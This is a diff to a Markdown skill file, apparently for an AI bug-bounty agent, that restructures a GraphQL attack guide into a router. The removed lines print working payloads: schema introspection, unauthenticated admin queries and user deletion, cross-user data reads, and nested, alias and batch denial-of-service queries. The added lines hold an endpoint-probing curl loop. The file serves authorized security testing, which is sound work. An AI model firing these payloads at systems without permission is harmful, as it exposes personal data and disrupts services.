@@ -1,15 +1,15 @@
 ---
 name: attack-graphql
-description: "GraphQL vulnerability testing — introspection exposure, complexity DoS, batch abuse, mutation auth bypass"
+description: "GraphQL router — locate the endpoint and map the schema, then load the variant sub-skill (recon-introspection / authz / dos-batch / injection-csrf)"
 category: "web-application"
-version: "1.0"
+version: "2.0"
 author: "bountyreper-official"
 tags:
   - graphql
   - api
-  - web
+  - introspection
   - dos
-  - attack
+  - authz
 tech_stack:
   - web
   - graphql
@@ -24,98 +24,37 @@ severity_boost:
   attack-idor-automation: "GraphQL introspection reveals IDOR-vulnerable queries"
 ---
 
-# GraphQL Vulnerability Testing
+# GraphQL Router
 
-## Objective
+## Route first — load the variant sub-skill
 
-Exploit GraphQL-specific vulnerabilities including schema exposure, query complexity abuse, and authorization bypass.
+GraphQL bugs split by the attack stage. Map the schema (or discover it's hidden), then
+load the matching sub-skill:
 
-## Testing Methodology
+| Goal | Variant | Load |
+|---|---|---|
+| Extract the schema / hunt hidden fields & suggestions | Recon + introspection | `skill(action="load", name="attack-graphql-recon")` |
+| Field-level authz bypass, IDOR via object nesting, mass assignment | Authorization | `skill(action="load", name="attack-graphql-authz")` |
+| Depth/complexity DoS, batching, alias/amplification abuse | DoS / batching | `skill(action="load", name="attack-graphql-dos")` |
+| GET-based queries, CSRF on mutations, subscriptions abuse | Injection / CSRF | `skill(action="load", name="attack-graphql-injection")` |
 
-### Phase 1: Automated Testing
-
-```bash
-# Full GraphQL test suite
-attack_script graphql_tester "https://TARGET/graphql" \
-  -H "Authorization:Bearer TOKEN" \
-  --json-output
-
-# Custom depth/batch
-attack_script graphql_tester "https://TARGET/graphql" \
-  --depth 15 --batch-count 100
-```
-
-### Phase 2: Introspection Query
+## Locate the endpoint (always first)
 
 ```bash
-# Full schema extraction
-curl -s -X POST https://TARGET/graphql \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ __schema { types { name fields { name type { name } } } mutationType { fields { name args { name type { name } } } } queryType { fields { name } } } }"}'
+for ep in /graphql /api/graphql /graphiql /api/graphiql /v1/graphql /query /api/v2/graphql; do
+  curl -s -o /dev/null -w "%{http_code} $ep\n" -X POST "https://TARGET$ep" \
+    -H "Content-Type: application/json" -d '{"query":"{__typename}"}'
+done
+# SPA traffic (interceptor inspect) shows the real path + required headers
 ```
 
-If introspection is enabled, map all types, queries, mutations, and subscriptions.
+## Proof requirements (all variants)
 
-### Phase 3: Authorization Bypass
+- Authz findings: TWO accounts, cross-account read/mutation shown (IDs REDACTED if PII)
+- DoS findings: request + timing/memory evidence, within program rate limits — DoS
+  testing needs explicit program authorization
+- Schema recon alone is NOT a finding on most programs — it's your recon step
 
-```graphql
-# Access admin queries without auth
-{ adminUsers { id email role } }
+## Notes
 
-# Mutation without auth
-mutation { deleteUser(id: "123") { success } }
-
-# Access other user's data
-{ user(id: "OTHER_USER_ID") { email ssn creditCard } }
-```
-
-### Phase 4: Complexity / DoS
-
-```graphql
-# Deeply nested query
-{ users { posts { comments { author { posts { comments { author { id } } } } } } } }
-
-# Alias multiplication
-{ a1: __typename a2: __typename ... a100: __typename }
-
-# Batch queries (array)
-[{"query":"{ __typename }"}, {"query":"{ __typename }"}, ... x50]
-```
-
-### Phase 5: Directive Abuse
-
-```graphql
-# Skip/include directive for info leakage
-{ user(id: "1") { name email @skip(if: false) secretField @include(if: true) } }
-
-# Field suggestions (error-based enum)
-{ user { nonExistentField } }
-# Error may suggest: "Did you mean: password, secret_key?"
-```
-
-## What Constitutes a Finding
-
-| Finding | Severity |
-|---------|----------|
-| Introspection enabled (schema exposed) | Medium (P3) |
-| Admin mutations accessible without auth | Critical (P1) |
-| Other user data accessible (IDOR) | High (P2) |
-| DoS via complexity (server timeout/crash) | Medium (P3) |
-| Batch queries bypass rate limiting | Medium (P3) |
-
-## Evidence Requirements
-
-- GraphQL endpoint URL
-- Query/mutation sent
-- Response showing unauthorized data
-- For introspection: schema dump (types, mutations, queries)
-- For DoS: response timing proving server overload
-
-## Tools
-
-- `attack_script graphql_tester` — automated introspection + DoS + batch testing
-
-## References
-
-- [PortSwigger: GraphQL](https://portswigger.net/web-security/graphql)
-- [HackerOne: GraphQL Bugs](https://www.hackerone.com/vulnerability-management/graphql-security-guide)
+- Multiple GraphQL versions on one host is common (v1 deprecated, still live) — test each
